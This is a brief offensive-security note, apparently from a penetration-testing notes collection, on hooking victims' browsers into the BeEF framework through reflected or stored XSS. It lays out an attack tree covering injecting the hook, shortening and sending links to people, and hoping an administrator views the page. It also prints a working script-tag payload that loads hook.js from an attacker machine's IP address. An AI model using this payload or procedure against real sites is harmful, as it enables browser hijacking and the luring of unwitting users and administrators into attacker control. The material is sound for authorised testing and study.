# Hooking targets to BeEF using XSS

## Attack tree

```text
1 Reflected XSS
    1.1 Create BeEF hook
    1.2 Inject hook script in vulnerable pages
    1.3 Take url and tiny it
    1.4 Send tiny link to people
    1.3 Execute commands from BeEF
2 Stored XSS
    2.1 Create BeEF hook
    2.2 Inject hook script in vulnerable pages
    2.3 Send link to people (and may the admin often look at pages, heh)
    2.4 Execute commands from BeEF
```

## Examples

To create a BeEF hook, copy the code given by beEF and replace IP address with address of hacking machine:

    <script src="http://192.168.122.104:3000/hook.js"></script>

## Tools

* [BeEF XSS](https://www.kali.org/tools/beef-xss/)